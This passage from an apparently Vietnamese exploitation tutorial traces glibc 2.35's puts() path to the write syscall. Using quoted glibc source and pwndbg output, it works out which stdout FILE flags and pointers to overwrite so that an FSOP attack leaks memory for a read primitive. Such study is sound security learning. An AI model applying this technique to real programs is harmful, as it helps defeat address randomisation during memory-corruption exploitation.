</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_read_base <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_end;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_CURRENTLY_PUTTING;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_mode <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> (_IO_LINE_BUF <span style="color:#f92672">|</span> _IO_UNBUFFERED))
</span></span><span style="display:flex;"><span>	f<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ch <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_IO_do_write</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>			 f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">==</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end ) <span style="color:#75715e">/* Buffer is really full */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_IO_do_flush</span> (f) <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> EOF;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>f<span style="color:#f92672">-&gt;</span>_IO_write_ptr<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> ch;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_UNBUFFERED)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">||</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_LINE_BUF) <span style="color:#f92672">&amp;&amp;</span> ch <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_IO_do_write</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>		      f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base) <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> EOF;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>) ch;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_hidden_ver</span> (_IO_new_file_overflow, _IO_file_overflow)
</span></span></code></pre></div><p>Lưu ý rằng, tham số thứ 2 đang lưu giá trị <code>EOF</code> (ch == EOF).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ch <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_IO_do_write</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>			 f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base);
</span></span></code></pre></div><p><code>_IO_do_write()</code> là hàm cuối cùng được gọi và nó là alias tới <code>_IO_new_do_write()</code></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L422">_IO_new_do_write</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">size_t</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_do_write</span> (FILE <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> to_do)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> count;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_IS_APPENDING)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* On a system without a proper O_APPEND implementation,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       you would need to sys_seek(0, SEEK_END) here, but is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       not needed nor desirable for Unix- or Posix-like systems.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       Instead, just indicate that offset (before and after) is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       unpredictable. */</span>
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> _IO_pos_BAD;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">!=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">off64_t</span> new_pos
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSSEEK</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">-</span> fp<span style="color:#f92672">-&gt;</span>_IO_read_end, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (new_pos <span style="color:#f92672">==</span> _IO_pos_BAD)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> new_pos;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSWRITE</span> (fp, data, to_do);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">&amp;&amp;</span> count)
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_adjust_column</span> (fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, data, count) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_IO_setg</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>  fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>  fp<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">=</span> (fp<span style="color:#f92672">-&gt;</span>_mode <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>		       <span style="color:#f92672">&amp;&amp;</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> (_IO_LINE_BUF <span style="color:#f92672">|</span> _IO_UNBUFFERED))
</span></span><span style="display:flex;"><span>		       <span style="color:#f92672">?</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base : fp<span style="color:#f92672">-&gt;</span>_IO_buf_end);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> count;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Cuối cùng trong hàm <code>_IO_new_do_write()</code> nó gọi tới <code>_IO_SYSWRITE (fp, data, to_do)</code>.</p>
<p><code>_IO_SYSWRITE</code> trỏ tới key <code>__write</code> trong vtable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#__write = 0x7ffff7c84f80 &lt;_IO_new_file_write&gt;
</span></span></span></code></pre></div><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L1172">_IO_new_file_write</a></p>
<pre tabindex="0"><code>ssize_t
_IO_new_file_write (FILE *f, const void *data, ssize_t n)
{
  ssize_t to_do = n;
  while (to_do &gt; 0)
    {
      ssize_t count = (__builtin_expect (f-&gt;_flags2
                                         &amp; _IO_FLAGS2_NOTCANCEL, 0)
			   ? __write_nocancel (f-&gt;_fileno, data, to_do)
			   : __write (f-&gt;_fileno, data, to_do)); -&gt; target
      if (count &lt; 0)
	{
	  f-&gt;_flags |= _IO_ERR_SEEN;
	  break;
	}
      to_do -= count;
      data = (void *) ((char *) data + count);
    }
  n -= to_do;
  if (f-&gt;_offset &gt;= 0)
    f-&gt;_offset += n;
  return n;
}
</code></pre><p>Rõ ràng ta thấy, cuối cùng nó sẽ gọi syscall <code>write()</code> để thực hiện in ra màn hình ?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">__write</span> (f<span style="color:#f92672">-&gt;</span>_fileno, data, to_do)
</span></span></code></pre></div><p>Mình tóm tắt flow của hàm <code>puts()</code> thành 1 sơ đồ sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>(str)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ <span style="color:#a6e22e">_IO_new_file_xsputn</span> (stdout, str, len)
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">|</span>_ <span style="color:#a6e22e">_IO_new_file_overflow</span> (stdout, EOF)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">|</span>_ <span style="color:#a6e22e">new_do_write</span>(stdout, stdout<span style="color:#f92672">-&gt;</span>_IO_write_base, stdout<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> stdout<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">|</span>_ <span style="color:#a6e22e">_IO_new_file_write</span>(stdout, stdout<span style="color:#f92672">-&gt;</span>_IO_write_base, stdout<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> stdout<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">|</span>_ <span style="color:#a6e22e">write</span>(stdout<span style="color:#f92672">-&gt;</span>fileno, stdout<span style="color:#f92672">-&gt;</span>_IO_write_base, stdout<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> stdout<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span></code></pre></div><p>-&gt; Mọi thứ đã rõ ràng rồi, mục tiêu của chúng ta là làm sao để thực hiện được <code>write(stdout-&gt;fileno, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)</code>. Việc cần làm đầu tiên là ta phải bypass được 1 loạt check đồ sộ ở trên.</p>
<p>Lúc gọi đến syscall <code>write</code>, mình kiểm tra giá trị của từng biến trong write.
Mình đặt break points ngay hàm <code>write</code> và lần lượt kiểm tra</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_2_1_stdout_
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  file <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    _flags <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">72537468</span>,
</span></span><span style="display:flex;"><span>    _IO_read_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_read_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_read_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592ac</span> <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_buf_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_buf_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555596a0</span> <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_save_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _IO_backup_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _IO_save_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _markers <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _chain <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7df6aa0</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdin_<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _fileno <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _flags2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _old_offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _cur_column <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _vtable_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;\000&#39;</span>,
</span></span><span style="display:flex;"><span>    _shortbuf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>    _lock <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7df8a30</span> <span style="color:#f92672">&lt;</span>_IO_stdfile_1_lock<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _codecvt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _wide_data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7df69a0</span> <span style="color:#f92672">&lt;</span>_IO_wide_data_1<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _freeres_list <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _freeres_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    __pad5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _mode <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _unused2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\000&#39;</span> <span style="color:#f92672">&lt;</span>repeats <span style="color:#ae81ff">19</span> times<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  vtable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7df3600</span> <span style="color:#f92672">&lt;</span>_IO_file_jumps<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Lúc này:
<code>stdout-&gt;fileno = 1</code>
<code>stdout-&gt;_IO_write_ptr = 0x5555555592ac</code>
<code>stdout-&gt;_IO_write_base = 0x5555555592a0 &quot;FSOP ATTACK\n&quot;</code></p>
<p>Giá trị <code>stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base</code> đúng bằng 12, bằng độ dài của chuỗi mà chúng ta muốn in.</p>
<p>1 suy nghĩ hiện lên, nếu ta có thể ghi đè những giá trị này ? Có nghĩa là ta sẽ điều khiển nó in cái gì mà ta muốn :&gt;. Khi đó chúng ta không cần phải quan ngại điều gì cả khi đã có địa chỉ LIBC&hellip; Hơn thế nữa là STACK, PIE, &hellip;..</p>
<p>Nhưng đời không như là mơ, sự thật <del>nỗ não</del> , chúng ta bắt buộc phải bypass tất cả các điều kiện ở trên nếu chúng ta muốn có <strong>READ PRIMITIVE</strong>.</p>
<p>Các macro được define như sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _IO_MAGIC 0xFBAD0000 </span><span style="color:#75715e">/* Magic number */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _OLD_STDIO_MAGIC 0xFABC0000 </span><span style="color:#75715e">/* Emulate old stdio. */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_MAGIC_MASK 0xFFFF0000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_USER_BUF 1 </span><span style="color:#75715e">/* User owns buffer; don&#39;t delete it on close. */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_UNBUFFERED 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_NO_READS 4 </span><span style="color:#75715e">/* Reading not allowed */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_NO_WRITES 8 </span><span style="color:#75715e">/* Writing not allowd */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_EOF_SEEN 0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_ERR_SEEN 0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_DELETE_DONT_CLOSE 0x40 </span><span style="color:#75715e">/* Don&#39;t call close(_fileno) on cleanup. */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_LINKED 0x80 </span><span style="color:#75715e">/* Set if linked (using _chain) to streambuf::_list_all.*/</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_IN_BACKUP 0x100
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_LINE_BUF 0x200
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_TIED_PUT_GET 0x400 </span><span style="color:#75715e">/* Set if put and get pointer logicly tied. */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_CURRENTLY_PUTTING 0x800
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_IS_APPENDING 0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_IS_FILEBUF 0x2000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_BAD_SEEN 0x4000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _IO_USER_LOCK 0x8000
</span></span></span></code></pre></div><p>Lần lượt đọc source và đi qua từng hàm để xem có thể khai thác được gì không:</p>
<p>Để thực hiện được <code>_IO_do_write()</code> thì mình lần lượt check từng câu lệnh if trong <code>_IO_new_file_overflow()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_NO_WRITES) <span style="color:#75715e">/* SET ERROR */</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_ERR_SEEN;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__set_errno</span> (EBADF);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> EOF;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Rõ ràng <code>f-&gt;_flags &amp; _IO_NO_WRITES</code> buộc phải trả về false thì mới thực hiện tiếp được.</p>
<pre tabindex="0"><code>   0x7ffff7c86e64 &lt;_IO_file_overflow+4&gt;     push   r12
   0x7ffff7c86e66 &lt;_IO_file_overflow+6&gt;     push   rbp
   0x7ffff7c86e67 &lt;_IO_file_overflow+7&gt;     push   rbx
   0x7ffff7c86e68 &lt;_IO_file_overflow+8&gt;     mov    eax, dword ptr [rdi]
   0x7ffff7c86e6a &lt;_IO_file_overflow+10&gt;    mov    rbx, rdi
 ► 0x7ffff7c86e6d &lt;_IO_file_overflow+13&gt;    test   al, 8
</code></pre><p><code>_IO_NO_WRITES = 8</code>  nên <code>stdout-&gt;_flags &amp; 8 = 0</code></p>
<ul>
<li><code>stdout-&gt;_flags &amp; 8 = 0</code></li>
</ul>
<p>Tiếp tục check tiếp, chúng ta phải khiến nó sao cho trả về False</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_CURRENTLY_PUTTING) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Allocate a buffer if needed. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_doallocbuf</span> (f);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_setg</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_buf_base, f<span style="color:#f92672">-&gt;</span>_IO_buf_base, f<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>Có nghĩa <code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code></p>
<p>Kiểm tra giá trị <code>_IO_CURRENTLY_PUTTING</code> trong gdb:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c86e75</span> <span style="color:#f92672">&lt;</span>_IO_file_overflow<span style="color:#f92672">+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>    mov    ebp, esi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c86e77</span> <span style="color:#f92672">&lt;</span>_IO_file_overflow<span style="color:#f92672">+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>    mov    rsi, qword ptr [rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x7ffff7c86e7b</span> <span style="color:#f92672">&lt;</span>_IO_file_overflow<span style="color:#f92672">+</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&gt;</span>    test   ah, <span style="color:#ae81ff">8</span>
</span></span></code></pre></div><p>Như vậy <code>f-&gt;_flags &amp; 8 = 1</code> || <code>f-&gt;_IO_write_base == NULL</code> -&gt; False</p>
<ul>
<li><code>f-&gt;_flags &amp; 0x0800 = 1</code></li>
</ul>
<p>Giả sử, chúng ta đã bypass qua 2 lần check đó
Ta đã lưu ý <code>ch</code> vẫn bằng EOF nên có thể thành công vào hàm <code>_IO_do_write()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ch <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_IO_do_write</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>			 f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base);
</span></span></code></pre></div><p><code>_IO_do_write()</code> gọi tới <code>_IO_new_do_write</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">size_t</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_do_write</span> (FILE <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> to_do)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> count;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_IS_APPENDING)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* On a system without a proper O_APPEND implementation,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       you would need to sys_seek(0, SEEK_END) here, but is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       not needed nor desirable for Unix- or Posix-like systems.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       Instead, just indicate that offset (before and after) is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       unpredictable. */</span>
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> _IO_pos_BAD;
